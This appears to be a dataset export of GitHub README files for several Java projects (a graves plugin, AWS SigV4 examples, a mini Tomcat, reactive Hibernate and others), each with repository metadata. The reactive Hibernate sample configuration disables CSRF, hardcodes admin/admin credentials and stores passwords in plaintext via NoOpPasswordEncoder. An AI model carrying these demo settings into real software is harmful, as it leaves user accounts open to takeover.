The **ULTIMATE** full-featured lightweight death chest plugin / player grave plugin! Every feature you could ever need
and more! While still being lightweight and efficient.

## Top Features

* Customizable
* Schematics
* Economy
* Regions
* Placeholders
* Protection
* Zombies
* Corpses
* Models
* Obituary
* Compass
* Head Drops
* Holograms
* Particles
* Tokens
* Blacklisting
* Reload Safe

## Supports

* 1.18.\*, 1.19.\*, 1.20.\*, 1.21.\*
* Spigot, Paper, Purpur, Airplane, Pufferfish, Tuinity, CraftBukkit, CatServer, Mohist, Magma, MultiPaper
* GeyserMC (Bedrock Players)
* Forge/Bukkit Hybrid servers (Mohist, Magma, CatServer)

## Integrations

* Vault (Economy)
* WorldEdit (Schematics)
* WorldGuard (Flags)
* PlaceholderAPI (Placeholders)
* FurnitureLib/DiceFurniture (Furniture)
* FurnitureEngine (Furniture)
* ItemsAdder (Furniture/Blocks)
* Oraxen (Furniture/Blocks)
* ChestSort (Sorting Grave)
* ProtectionLib (Protected Region Detection)
* PlayerNPC (Corpses)

* Towny
* ItemBridge
* MineDown
* MiniMessage

## Screenshots

![Screenshot 1](images/screenshot_1.png)
![Screenshot 2](images/screenshot_2.png)

## Videos

[![Graves plugin](https://img.youtube.com/vi/mq8aoZE6Jl0/0.jpg)](https://www.youtube.com/watch?v=mq8aoZE6Jl0)

**Video by:** _ServerMiner_

## Commands

| Command                                           | what does it do?             |
|---------------------------------------------------|------------------------------|
| **/graves**                                       | Player graves                |
| **/graves help**                                  | Plugin info                  |
| **/graves list** _{player}_                       | List another players graves. |
| **/graves givetoken** _{player} {token} {amount}_ | Give grave token (OP)        |
| **/graves dump**                                  | Dump server information (OP) |
| **/graves debug** _{level}_                       | Change debug level (OP)      |
| **/graves reload**                                | Reload command (OP)          |

## Permissions

    graves.place (Default)
    graves.open (Default)
    graves.break (Default)
    graves.teleport (Default)
    graves.experience (Default)
    graves.autoloot (Default)
    graves.gui (Default)
    graves.gui.other (OP)
    graves.givetoken (OP)
    graves.bypass (OP)
    graves.reload (OP)

## Bug Reports

If you find bugs please report them [here](https://github.com/svaningelgem/graves/issues).

## Usage

![Server usage](https://bstats.org/signatures/bukkit/AvarionGraves.svg)

## Links

- **Spigot**: https://www.spigotmc.org/resources/graves.116202/
- **bStats**: https://bstats.org/plugin/bukkit/AvarionGraves/21607
- **GitHub**: https://github.com/AvarionMC/graves
",,,2024-04-11T20:36:14Z,2024-09-23T15:49:41Z,2024-09-18T04:46:21Z,6,5,59,118,5,4,23,3,2,GPL-3.0,Java
aws-samples/sigv4-signing-examples,main,"# SigV4 Signing Examples

This repository contains example code implementing the [AWS Signature Version 4 (SigV4)](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_aws-signing.html) protocol for signing requests. 

It is recommended wherever possible that you instead [use the AWS SDKs for creating signed requests](https://docs.aws.amazon.com/IAM/latest/UserGuide/create-signed-request.html#code-signing-examples). There are some scenarios where that might not be possible, such as in IoT or embedded applications where the AWS SDK is not available. As such, the examples in this repository are split in two sets; ""sdk"" and ""no-sdk"". The SDK examples show how to use built-in features of the AWS SDK to construct SigV4 signed requests. The No-SDK examples show how to implement the signing from scratch, without the AWS SDK.

The examples in this repository use an AWS API Gateway execute-api request. The API Gateway has an IAM Authorizer, which requires the request to be signed using the SigV4 protocol. You can adjust the examples depending on the AWS API you wish to call. 

The examples in this repository use temporary credentials. These are are short-lived access credentials and are preferred to long-lived security credentials where possible. For example these might be provided by assuming a role or vended by a token management service. If you want to change any of the examples to use long-lived security credentials instead, simply remove the `x-amz-security-token` header from the request. 

For example, in NodeJS, change the headers from this:

```javascript
  headers: {
    'host': host,
    'x-amz-date': amzDate,
    'x-amz-security-token': sessionToken,
    'Authorization': authorizationHeader
  }
```

To this:

```javascript
  headers: {
    'host': host,
    'x-amz-date': amzDate,
    'Authorization': authorizationHeader
  }
```

Note this repository only contains examples implementing SigV4. For Signature Version 4A (SigV4A) visit the [SigV4a Signing Examples repository](https://github.com/aws-samples/sigv4a-signing-examples).

## Deploying the sample application

A sample application is provided for you to test the SigV4 protocol with. This application deploys a simple serverless API with an AWS API Gateway backed by an AWS Lambda function. 

To deploy the application, the Serverless Application Model (SAM) is used:

```
sam deploy --guided
```

```
Configuring SAM deploy
======================

        Looking for config file [samconfig.toml] :  Not found

        Setting default arguments for 'sam deploy'
        =========================================
        Stack Name [sam-app]: sigv4api
        AWS Region [eu-west-2]: us-east-1
        #Shows you resources changes to be deployed and require a 'Y' to initiate deploy
        Confirm changes before deploy [y/N]: N
        #SAM needs permission to be able to create roles to connect to the resources in your template
        Allow SAM CLI IAM role creation [Y/n]: Y
        #Preserves the state of previously provisioned resources when an operation fails
        Disable rollback [y/N]: y
        HelloWorldFunction has no authentication. Is this okay? [y/N]: y
        Save arguments to configuration file [Y/n]: Y
        SAM configuration file [samconfig.toml]: 
        SAM configuration environment [default]: 
```

Once deployed, retrieve the ApiUrl from the Outputs section and set this and the path as environment variables:

```
export RESTAPIHOST=""myapi123.execute-api.us-east-1.amazonaws.com""
export RESTAPIPATH=""/Prod/hello""
```

You must also have AWS Credentials set in the environment:

```
export AWS_ACCESS_KEY_ID=ASIAUZABC123456
export AWS_SECRET_ACCESS_KEY=5wfFi0FEaaaaacccc1111111111111
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjE...
```

## Using the examples

For all the examples, a simple ""Hello World!"" response indicates things are working as expected.

## No-SDK

This section provides examples in the following frameworks:

* Java
* .NET (C#)
* NodeJS
* Python3
* Go

### Java

```
cd ./java
javac AWSSigner.java
java AWSSigner
```

### .NET

```
cd ./dotnet
dotnet build
dotnet run
```

### NodeJS

```
cd ./nodejs
node main.js
```

### Python

```
cd ./python
python3 main.py
```

### Go

```
cd ./golang
go build
./main
```

## SDK

This section provides examples in the following frameworks:

* NodeJS
* Python3
* Go

### NodeJS

```
cd ./nodejs
npm i
node main.js
```

### Python

```
cd ./python
pip3 install -r requirements.txt
python3 main.py
```

### Go

```
cd ./golang
go get
go build
./main
```",,,2024-04-04T14:47:05Z,2024-04-04T14:50:53Z,,0,12,1,10,0,0,22,1,0,MIT-0,Java
houbb/minicat,master,"# 项目简介

```
 /\_/\  
( o.o ) 
 > ^ <
```

mini-cat 是简易版本的 tomcat 实现。别称【嗅虎】(心有猛虎，轻嗅蔷薇。)

[![Maven Central](https://maven-badges.herokuapp.com/maven-central/com.github.houbb/minicat/badge.svg)](http://mvnrepository.com/artifact/com.github.houbb/minicat)
[![Build Status](https://www.travis-ci.org/houbb/minicat.svg?branch=master)](https://www.travis-ci.org/houbb/minicat?branch=master)
[![Coverage Status](https://coveralls.io/repos/github/houbb/minicat/badge.svg?branch=master)](https://coveralls.io/github/houbb/minicat?branch=master)

# 特性

- 简单的启动实现/netty 支持

- servlet 支持

- 静态网页支持

- filter/listener 支持

- wars 支持

# 变更日志

> [变更日志](CHANGE_LOG.md)

# 快速开始

## maven 依赖

```xml
<dependency>
    <groupId>com.github.houbb</groupId>
    <artifactId>minicat</artifactId>
    <version>0.7.0</version>
</dependency>
```

## 启动测试

运行测试类 `MiniCatBootstrapMain#main`

```java
MiniCatBootstrap bootstrap = new MiniCatBootstrap();
bootstrap.start();
```

启动日志：

```
[INFO] [2024-04-03 11:09:15.178] [main] [c.g.h.m.s.s.WebXmlServletManager.register] - [MiniCat] register servlet, url=/my, servlet=com.github.houbb.minicat.support.servlet.MyMiniCatHttpServlet
[INFO] [2024-04-03 11:09:15.180] [Thread-0] [c.g.h.m.b.MiniCatBootstrap.startSync] - [MiniCat] start listen on port 8080
[INFO] [2024-04-03 11:09:15.180] [Thread-0] [c.g.h.m.b.MiniCatBootstrap.startSync] - [MiniCat] visit url http://127.0.0.1:8080
```

页面访问：[http://127.0.0.1:8080](http://127.0.0.1:8080)

响应：

```
http://127.0.0.1:8080
```

## 测试

servlet: http://127.0.0.1:8080/my

html: http://127.0.0.1:8080/index.html

# 系列教程

[从零手写实现 apache Tomcat-01-入门介绍](https://houbb.github.io/2016/11/07/web-server-tomcat-02-hand-write-overview)

[从零手写实现 apache Tomcat-02-web.xml 入门详细介绍](https://houbb.github.io/2016/11/07/web-server-tomcat-02-hand-write-web-xml)

[从零手写实现 tomcat-03-基本的 socket 实现](https://houbb.github.io/2016/11/07/web-server-tomcat-03-hand-write-simple-socket)

[从零手写实现 tomcat-04-请求和响应的抽象](https://houbb.github.io/2016/11/07/web-server-tomcat-04-hand-write-request-and-resp)

[从零手写实现 tomcat-05-servlet 处理支持](https://houbb.github.io/2016/11/07/web-server-tomcat-05-hand-write-servlet-web-xml)

[从零手写实现 tomcat-06-servlet bio/thread/nio/netty 池化处理](https://houbb.github.io/2016/11/07/web-server-tomcat-06-hand-write-thread-pool)

[从零手写实现 tomcat-07-war 如何解析处理三方的 war 包？](https://houbb.github.io/2016/11/07/web-server-tomcat-07-hand-write-war)

[从零手写实现 tomcat-08-tomcat 如何与 springboot 集成？](https://houbb.github.io/2016/11/07/web-server-tomcat-08-hand-write-embed)

[从零手写实现 tomcat-09-servlet 处理类](https://houbb.github.io/2016/11/07/web-server-tomcat-09-hand-write-servlet)

[从零手写实现 tomcat-10-static resource 静态资源文件](https://houbb.github.io/2016/11/07/web-server-tomcat-10-hand-write-static-resource)

[从零手写实现 tomcat-11-filter 过滤器](https://houbb.github.io/2016/11/07/web-server-tomcat-11-hand-write-filter)

[从零手写实现 tomcat-12-listener 监听器](https://houbb.github.io/2016/11/07/web-server-tomcat-12-hand-write-listener)


# ROAD-MAP

- [x] servlet 标准支持
- [x] 请求线程池支持
- [x] NIO 实现
- [x] netty 实现
- [x] 加载 war 包
- [x] listener 的实现
- [] error/welcome 页面？
- [] printWriter 等兼容不够优雅
- [] 内嵌支持？
- [] session
- [] 注解的解析支持
",The mini tomcat.(手写从零实现简易版 tomcat。别称【嗅虎】心有猛虎，轻嗅蔷薇。),"jar,java,jboss,jetty,netty,servlet,tomcat,war,web",2024-04-02T01:13:26Z,2024-05-08T00:56:36Z,,0,1,0,17,0,1,21,8,0,NOASSERTION,Java
theodo-fintech/spring-data-event,main,"[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]

<div align=""center"">
  <h1 align=""center"">Spring Data Event</h1>
</div>

### Features

- **Data Event Entity**: Set up your JPA Entities to be automatically sent over Kafka topics when saved, updated or deleted simply using `@DataEventEntity`

More to come later... Stay tuned ! 


## Getting Started

### Prerequisites

This library has been currently tested on projects under SpringBoot on version 3.2.4 with Java 17 or later, using Hibernate as a JPA implementation.


### Installation

You will have to add the dependency in your spring-boot-project

```xml
<dependency>
    <groupId>com.sipios</groupId>
    <artifactId>spring-data-event</artifactId>
    <version>0.1.0</version>
</dependency>
```

### Configuration

Set up your application properties file to make spring kafka work properly

```txt
spring.kafka.bootstrap-servers=localhost:29092
```

Then, you will have to enable the library so that it will be able to work properly.
You just add the `@EnableDataEvent` on any of your `@Configuration` class already existing on your project, or directly on the `@SpringBootApplication` class.

## Usage


To mark a JPA entity to be automatically sent over event platform, put the `@DataEventEntity` on your entity

For instance

```java

@Entity
@DataEventEntity
@Table(name= ""user_account"")
public class UserEntity {

    @Id
    @Column(name = ""id"", nullable = false)
    @GeneratedValue(strategy = GenerationType.UUID)
    private UUID id;


}
```

By default, the topics on which the event will be sent are : 
- For the creation : `entity_name.created` (for example : `userentity.created`)
- For the update : `entity_name.updated` (for example : `userentity.updated`)
- For the deletion : `entity_name.deleted` (for example : `userentity.deleted`)


## FAQs

No FAQ at the moment

## Roadmap

- [x] Add simple case of sending creation, update and deletion event over kafka
- [ ] Allow customizing which events should be sent or not 
- [ ] Allow customizing which attribute from the entity to be sent or not 
- [ ] Allow other event techno as RabbitMQ or Apache Pulsar

## Contributing

We are just getting started on this project and would **highly appreciate** contributions

## License

Distributed under the MIT License. See [LICENSE](/LICENSE.txt) for more information.


[stars-shield]: https://img.shields.io/github/stars/sipios/spring-data-event?style=for-the-badge
[stars-url]: https://github.com/sipios/spring-data-event/stargazers
[issues-shield]: https://img.shields.io/github/issues/sipios/spring-data-event?style=for-the-badge
[issues-url]: https://github.com/sipios/spring-data-event/issues
[license-url]: https://github.com/sipios/spring-data-event/blob/main/LICENSE
",,,2024-04-18T07:33:55Z,2024-05-31T09:13:14Z,,0,4,4,17,1,0,21,3,1,MIT,Java
anaconda875/reactive-hibernate-spring-boot-starter,main,"## This module's aim is to bring Reactive Hibernate support to Spring Data.
### Some features:
1. Useful Crud and Paging/Sorting methods (just like spring-data-jpa)
2. Custom query methods (findBy\*And\*OrderBy*, @Query(""FROM Abc"")), native queries are also supported
3. Support `@Transactional` (**propagation, readOnly, rollbackFor, timeout, noRollbackFor, ...**)
4. Support `@Modifying`, `@Param`
5. Support `@Lock`, `@EntityGraph`
6. Support `@NamedQuery`, `@NamedEntityGraph`
7. Support SpEL
8. Support Pagination
9. Support Auditing
10. Auto-config
11. Of course, it is truly non-blocking and compatible with Webflux

### Some remaining things:
1. Isolation level ([#875](https://github.com/hibernate/hibernate-reactive/issues/875) and [#432](https://github.com/eclipse-vertx/vertx-sql-client/issues/432)), savepoint
2. Stored procedure ([#1446](https://github.com/eclipse-vertx/vertx-sql-client/issues/1446) and [#637](https://github.com/hibernate/hibernate-reactive/issues/637))
3. Code optimization

## Getting started:
**1. Dependency and config:**
```xml
<dependency>
    <groupId>io.github.anaconda875</groupId>
    <artifactId>reactive-hibernate-spring-boot-starter</artifactId>
    <version>1.1.0</version>
</dependency>
```
Sometimes you might need to add (in case of dependencies conflict):
```xml
<dependency>
    <groupId>org.hibernate.orm</groupId>
    <artifactId>hibernate-core</artifactId>
    <version>6.4.4.Final</version>
    <scope>compile</scope>
</dependency>
```
Add a suitable driver (for example, MySQL):
```xml
<dependency>
    <groupId>io.vertx</groupId>
    <artifactId>vertx-mysql-client</artifactId>
    <version>${your.version}</version>
</dependency>
```
Then add these (example) configs:
```properties
spring.jpa.properties.jakarta.persistence.jdbc.url=jdbc:mysql://localhost:3306/blogdb
spring.jpa.properties.jakarta.persistence.jdbc.user=mysql
spring.jpa.properties.jakarta.persistence.jdbc.password=mysql

spring.jpa.properties.hibernate.connection.pool_size=10

spring.jpa.properties.hibernate.enhancer.enableDirtyTracking=false
spring.jpa.properties.hibernate.enhancer.enableLazyInitialization=false
spring.jpa.properties.hibernate.enhancer.enableAssociationManagement=false
```
**2. Useful Crud and Paging/Sorting methods**: see [ReactiveCrudRepository](src/main/java/com/htech/data/jpa/reactive/repository/ReactiveCrudRepository.java) and [ReactivePagingAndSortingRepository](src/main/java/com/htech/data/jpa/reactive/repository/ReactivePagingAndSortingRepository.java)  
**3. Custom query methods (with `Pageable`, `@Lock`, `@EntityGraph`, `@Param`, `@Transactional`, `@Modifying`):**
```java
  @Lock(LockModeType.PESSIMISTIC_READ)
  @EntityGraph(attributePaths = {""content""})
  Flux<Post> findByContentOrderByCreatedAtDesc(String content);
```
```java
  @Query(""SELECT p FROM Post p WHERE p.content = ?1"")
  Mono<Page<Post>> findByContentCustomPage(String content, Pageable pageable);
```
```java
    @Query(
        nativeQuery = true,
        value =
            ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by "" +
                ""FROM posts WHERE id = ?1"")
    Mono<Post> nativeQ(UUID id);
```
```java
  @Query(
      nativeQuery = true,
      value =
          ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by ""
              + ""FROM posts WHERE content = :content"")
  Flux<Post> nativeQ2(@Param(""content"") String content);
```
```java
  @Modifying
  @Query(nativeQuery = true, value = ""DELETE from posts WHERE content = :content"")
  @Transactional
  Mono<?> deleteNative2(@Param(""content"") String content);
```
```java
  @Modifying
  @Query(""DELETE FROM Post p WHERE p.title = :title"")
  Mono<?> deleteCustom(@Param(""title"") String title);
```
**4. Support `@NamedQuery`, `@NamedEntityGraph`, Auditing:**
```java
@Data
@Entity
@NamedQueries(
    value = {
      @NamedQuery(
          name = ""Post.testNamed"",
          query = ""SELECT p FROM Post p WHERE p.content = :content"")
    })
@NamedEntityGraphs({
  @NamedEntityGraph(
      name = ""Post.testNamed"",
      attributeNodes = {@NamedAttributeNode(""title"")})
})
public class Post {

  @Id
  @GeneratedValue(generator = ""uuid"")
  @GenericGenerator(name = ""uuid"", strategy = ""uuid2"")
  UUID id;

  String title;
  String content;

  //<Auditing>
  @Column(name = ""created_at"")
  @CreatedDate
  LocalDateTime createdAt;

  @Column(name = ""last_modified_at"")
  @LastModifiedDate
  LocalDateTime lastModifiedAt;

  @Column(name = ""created_by"")
  @CreatedBy
  String createdBy;

  @Column(name = ""last_modified_by"")
  @LastModifiedBy
  String lastModifiedBy;
  //</Auditing>
}
```
```java
  //In repository
  @Lock(LockModeType.READ)
  @EntityGraph
  Mono<Page<Post>> testNamed(String content, Pageable pageable);
```
```java
//Config for Pagination, Auditing
@Configuration
@EnableReactiveJpaAuditing(auditorAwareRef = ""reactiveAuditorAware"")
public class Config {

  @Bean
  WebFluxConfigurer webFluxConfigurer() {
    return new WebFluxConfigurer() {
      @Override
      public void configureArgumentResolvers(ArgumentResolverConfigurer configurer) {
        configurer.addCustomResolver(new ReactivePageableHandlerMethodArgumentResolver());
      }
    };
  }

  @Bean
  ReactiveAuditorAware<String> reactiveAuditorAware() {
    return () ->
        ReactiveSecurityContextHolder.getContext()
            .map(SecurityContext::getAuthentication)
            .map(Authentication::getPrincipal)
            .map(UserDetails.class::cast)
            .map(UserDetails::getUsername);
  }

  @Bean
  SecurityWebFilterChain securityWebFilterChain(ServerHttpSecurity http) {
    return http.csrf(ServerHttpSecurity.CsrfSpec::disable)
        .authorizeExchange(authorize -> authorize.anyExchange().authenticated())
        .httpBasic(Customizer.withDefaults())
        .build();
  }

  @Bean
  ReactiveUserDetailsService userDetailsService() {
    var isabelle = User.withUsername(""admin"").password(""admin"").authorities(""admin"").build();

    var bjorn =
        User.withUsername(""anonymous"").password(""anonymous"").authorities(""anonymous"").build();

    return new MapReactiveUserDetailsService(isabelle, bjorn);
  }

  @Bean
  PasswordEncoder passwordEncoder() {
    return NoOpPasswordEncoder.getInstance();
  }

  @Bean
  ReactiveEvaluationContextExtension securityExtension() {
    return new ReactiveEvaluationContextExtension() {

      @Override
      public String getExtensionId() {
        return ""webflux-security"";
      }

      @Override
      public Mono<? extends EvaluationContextExtension> getExtension() {
        return ReactiveSecurityContextHolder.getContext()
            .map(SecurityContext::getAuthentication)
            .map(SecurityEvaluationContextExtension::new);
      }
    };
  }
}

```
**5. SpEL:**
```java
  @Query(
      nativeQuery = true,
      value =
          ""SELECT id, title, content, created_at, created_by, last_modified_at, last_modified_by FROM posts "" +
              ""WHERE created_by = :#{authentication.name} AND title = :title "" +
              ""AND last_modified_by = :#{authentication.name}"")
  Mono<Post> testSpelNative2(@Param(""title"") String title);
```
```java
  @Query(
      ""SELECT p from #{#entityName} p WHERE p.lastModifiedBy = :#{authentication.name} AND p.title = ?1 AND p.createdBy = :#{authentication.name}"")
  @EntityGraph(attributePaths = {""createdBy""})
  Mono<Post> testSpel3(String title);
```

**6. TO BE CONTINUED...**

This is an example of how to use it (with Postgres): https://github.com/anaconda875/spring-hibernate-reactive-mutiny-example

If you guys find it useful for our business, feel free to use and report bugs to me
",,,2024-04-21T05:54:50Z,2024-07-20T08:15:34Z,,0,2,11,5,0,2,21,12,0,Apache-2.0,Java
tiremoscode/curso-java-md-22,main,"### Curso de Java
",,,2024-04-25T17:42:13Z,2024-06-08T06:27:33Z,,0,15,26,68,0,20,20,1,0,,Java
songbiaoself/SuperHotSwap,develop,"# SuperHotSwap

开发初心：旨在做出一款最便捷的IDEA热更新插件，减少用户操作步骤，提供零配置的可视化操作更新。

## 开发环境

- JDK1.8
- IDEA2021.3
- Gradle8.7

## 支持功能

| 支持功能          | 是否支持 | 说明                                    |
|---------------|------|---------------------------------------|
| MybatisXML热更新 | √    |                                       |
| Class热更新      | √    | 增强功能需安装dcevm补丁。支持动态新增类热更新，支持lombok热更新 |
| Spring热更新     | √    | 支持bean注册，销毁。支持动态更新RequestMapping      |
| 远程热更新         | 进行中  |                                       |
| ...           | ...  |                                       |

## 使用流程

1. 在插件市场搜索安装
   ![img.png](img/install.png)

2. 启动项目

安装成功后重启IDEA，启动项目后输出Banner表示安装成功
![img_1.png](img/banner.png)

3. Mapper热更新

在MapperXML文件下点击`File Hot Swap`按钮执行热更新指令，指令正常输出如下
![img.png](img/xml-hotswap.png)

4. Java热更新

idea文件自动保存是有延迟的，记得先手动<b>ctrl+s</b>保存一下
![img.png](img/class-hotswap.gif)

5. Spring热更新

支持动态创建、编辑、删除接口。演示如下。
![img.png](img/spring-hotswap.gif)


Instrumentation类重新加载的局限性

- 新类和老类的父类必须相同。
- 新类和老类实现的接口数也要相同，并且是相同的接口。
- 新类和老类访问符必须一致。
- 新类和老类字段数和字段名要一致。
- 新类和老类新增或删除的方法必须是private static/final修饰的。
- 可以修改方法体。

想要去除限制，需要安装jdk补丁，DECVM补丁下载地址：
[https://github.com/dcevm/dcevm](https://github.com/dcevm/dcevm)

下载对应jdk版本补丁，替换即可完成安装。
![img.png](img/jvmdll.png)

## 联系方式

gitee地址: https://gitee.com/song_biao/super-hot-swap

github地址: https://github.com/songbiaoself/SuperHotSwap

<646997146@qq.com>
",IDEA热更新插件，旨在做出一款最便捷的热更新插件,,2024-04-26T07:33:27Z,2024-09-14T09:56:39Z,2024-09-11T02:30:38Z,1,1,2,34,0,4,20,2,0,,Java
rongliangtang/r-pan-server,main,"# R-Pan
R-Pan 是一个**简单易用、支持分布式存储**的网盘系统。

**""R""** 取自我的名字，用以代表该项目。

这个仓库为后端代码，前端代码仓库地址可以在 [R-Pan-Portal](https://github.com/rongliangtang/r-pan-portal) 找到。

[在线体验地址](https://pan.tangrl.cn)

## 功能
目前已经实现下面这些功能：

- 支持用户注册、登录及密码修改。
- 提供高性能的文件上传、下载和分享功能。
- 支持分片上传和秒传技术，提升上传效率。
- 提供回收站功能，便于恢复误删文件。
- 支持多种存储方式，包括本地存储、OSS 对象存储和 FastDFS 分布式存储。
- 实现视频、图片、PDF 等文件的在线预览功能。

## 开发环境
| **组件** | **版本**      | **说明**                                              |
|--------|---------------|-------------------------------------------------------|
| JDK    | 8             | Java 开发环境                                          |
| IDEA   | 2024.1        | 主要的开发工具                                         |
| Maven  | 3.6.3         | 构建和依赖管理工具                                     |
| Spring Boot | 2.2.5         | 用于快速构建后端服务的 Spring 框架                     |
| MySQL  | 8.0.33        | 关系型数据库管理系统                                   |
| Redis  | 7.0.11        | 缓存和数据存储的内存数据库                             |
| RocketMQ | 4.5.1         | 分布式消息中间件，支持高吞吐的消息处理                 |
| ZooKeeper | 3.5.3         | 分布式协调和管理组件，支持服务发现和配置管理           |
| FastDFS | -             | 分布式文件存储系统，提供高效的文件管理服务             |

## 系统架构

<img src=""https://blog-1259405505.cos.ap-guangzhou.myqcloud.com/arch.png"" width=""500"">

## 如何运行
以下是本地运行该后端服务的步骤：

### 步骤 1：克隆项目代码
使用以下命令克隆后端服务的源代码：

```shell
git clone https://github.com/rongliangtang/r-pan-server.git
```

### 步骤 2：配置环境
根据操作系统，按照开发环境的要求进行配置。
可以参考各组件的官方文档或相关资料完成环境设置。

### 步骤 3：创建数据库
创建一个名为 `r_pan` 的数据库，并执行 `distribution/conf/db.sql` 文件中的 SQL 语句以创建所需的数据表。


### 步骤 4：配置消息中间件
完成 RocketMQ 和 Dashboard 的安装后，创建以下主题（Topics）：`testTopic`、`errorLogTopic`、`deleteFileTopic`、`fileRestoreTopic`、`physicalDeleteFileTopic`、`userSearchTopic`。

### 步骤 5：修改项目配置文件
根据本地环境，修改 `server/resource/application.yaml` 文件中的相关配置参数，确保项目适应当前的系统环境。

## 界面示例
### 登录
![](https://blog-1259405505.cos.ap-guangzhou.myqcloud.com/20240906112645.png)

### 文件列表
![](https://blog-1259405505.cos.ap-guangzhou.myqcloud.com/20240906112706.png)

### 文件分享
![](https://blog-1259405505.cos.ap-guangzhou.myqcloud.com/20240906112821.png)

### 回收站
![](https://blog-1259405505.cos.ap-guangzhou.myqcloud.com/20240906112749.png)

## TODO
- 前端
  - 优化 UI 和布局
- 后端
  - 实现文件夹的读取和下载
  - 支持 MinIO
  - 拆分成微服务，引入 Spring Cloud 网关、链路追踪、相关组件、服务治理等组件
- 部署
  - 编写 dockerfile，实现一键部署
  - 实现 GitOps，基于 Jenkins 实现 CI/CD
  - 部署到 K8S 集群",一个简单易用、支持分布式存储的网盘系统。,,2024-04-23T06:32:58Z,2024-09-06T03:35:30Z,,0,1,0,7,0,4,20,1,0,MIT,Java
CAKK-DEV/cakk-server,master,"# &nbsp; 케이크크 <a href=""https://apps.apple.com/kr/app/%EC%BC%80%EC%9D%B4%ED%81%AC%ED%81%AC/id6449973946""><img src=""https://github.com/CAKK-DEV/cakk-server/assets/56003992/36114846-3e0b-493c-9638-c02ad4b3a44e"" align=""left"" width=""100""></a>

[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fcakk-dev%2Fcakk-server&count_bg=%2328DBE6&title_bg=%232D3540&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false)](https://hits.seeyoufarm.com)
[![codecov](https://codecov.io/gh/cakk-dev/cakk-server/graph/badge.svg?token=WMYRL0M1PU)](https://codecov.io/gh/cakk-dev/cakk-server)
[![Github Action](https://github.com/cakk-dev/cakk-server/actions/workflows/ci.yml/badge.svg)](https://github.com/cakk-dev/cakk-server/actions)

<br>

## Download (준비중)

- #### [App Store Download](https://apps.apple.com/kr/app/%EC%BC%80%EC%9D%B4%ED%81%AC%ED%81%AC/id6449973946)
- #### [Play Store Download](https://play.google.com/store/apps/details?id=com.prography.cakk&pcampaignid=web_share)

## Introduction

![Introduction](https://github.com/CAKK-DEV/cakk-server/assets/56003992/53515b12-d198-4a67-bc29-a8c4ef02df35)

## Server Developers

|                                                                                                                                                                                                                                                 Hyunseok                                                                                                                                                                                                                                                  |                                                                                                                                                                                                                                                          Taeyong                                                                                                                                                                                                                                                           |
|:---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------:||
| <img src=""https://avatars.githubusercontent.com/u/56003992?v=4"" width=""100"" height=""100"" style=""border-radius: 50%;""><br/><a href=""https://www.linkedin.com/in/hyunseok-ko-326b62254"" target=""_blank""><img src=""https://img.shields.io/badge/Hyunseok Ko-%230077B5.svg?style=for-the-socail&logo=linkedin&logoColor=white""/></a><br/><a href=""https://github.com/lcomment"" target=""_blank""><img src=""https://img.shields.io/badge/lcomment-181717?style=for-the-social&logo=github&logoColor=white""/></a> | <img src=""https://avatars.githubusercontent.com/u/86272688?v=4"" width=""100"" height=""100"" style=""border-radius: 50%;""><br/><a href=""https://www.linkedin.com/in/%ED%83%9C%EC%9A%A9-%EA%B9%80-76a31228a"" target=""_blank""><img src=""https://img.shields.io/badge/Taeyong Kim-%230077B5.svg?style=for-the-social&logo=linkedin&logoColor=white""/></a><br/><a href=""https://github.com/YongsHub"" target=""_blank""><img src=""https://img.shields.io/badge/YongsHub-181717?style=for-the-social&logo=github&logoColor=white""/></a> |   <img src=""https://avatars.githubusercontent.com/u/42805428?v=4"" width=""100"" height=""100"" style=""border-radius: 50%;""><br/><a href=""https://github.com/skmwit"" target=""_blank""><img src=""https://img.shields.io/badge/skmwit-181717?style=for-the-social&logo=github&logoColor=white""/></a>     |

## Architecture

![Architecture](https://github.com/CAKK-DEV/cakk-server/assets/56003992/351d1a27-c887-434a-85cf-f1c1f1c29d25)

## Trouble Shooting

- #### [(2024.06.26) Batch를 공짜로 돌린다고?](https://velog.io/@komment/Spring-Batch-free-cost)
- #### [(2024.06.21) Hibernate Spatial, 그리고 MySQL과 함께하는 QueryDSL을 활용한 위치 기반 쿼리](https://velog.io/@taeyong_5201/Hibernate-Spatial-%EA%B7%B8%EB%A6%AC%EA%B3%A0-MySQL%EA%B3%BC-%ED%95%A8%EA%BB%98%ED%95%98%EB%8A%94-Spring-Boot-%EA%B8%B0%EB%B0%98-%EC%95%A0%ED%94%8C%EB%A6%AC%EC%BC%80%EC%9D%B4%EC%85%98)
- #### [(2024.06.15) 동시성 문제와 쉐도우 복싱할 뻔한 이야기 (with. Redis)](https://velog.io/@komment/concurrency-shadow-boxing)
- #### [(2024.06.11) 간단하게 OIDC 소셜 로그인 3개 Ctrl+v 하기](https://velog.io/@komment/Cakk-OIDC-Ctrlv)

## Directory Structure

```
├── .github
├── config
│   ├── checkstyle
│   │   ├── checkstyle-rules
│   │   └── checkstyle-suppressions 
│   └── formatter
│       └── intellij-formatter
├── cakk-api
├── cakk-batch
├── cakk-common
├── cakk-client
├── cakk-external
└── cakk-domain
    ├── mysql
    └── redis
```
",Cakk 🍰,,2024-04-16T14:11:28Z,2024-09-09T02:06:21Z,2024-09-09T02:06:21Z,5,2,139,565,0,0,20,8,3,,Java
alura-es-cursos/2066-desafio-persistiendo-datos-artistas-canciones,main,"
![Programação-Desafío](https://github.com/genesysR-dev/2066-desafio-persistiendo-datos-artistas-canciones/assets/91544872/6675312c-06e9-4a44-a869-683c332dcd71)

# Desafío
Vamos a implementar una aplicación para almacenar datos de nuestros artistas y canciones preferidas en una base de datos relacional, pudiendo buscar información por artistas y consultar datos sobre los mismos a través de integración con la API de ChatGPT.

Necesitarás una clase Artista, con los datos para representar el mismo;
También será necesario una clase específica para representar las canciones;
Para el artista, puedes practicar la implementación de un enum, para definir el tipo de artista, por ejemplo: solista, dúo o banda;
Recuerda crear el proyecto a través del sitio [Spring Initializr](https://start.spring.io/), donde ya es posible añadir las dependencias de Spring Data JPA y PostgreSQL;
Crea una clase principal con el menú, con las opciones deseadas, como: registrar artista, registrar canción, buscar canciones por artistas, etc;
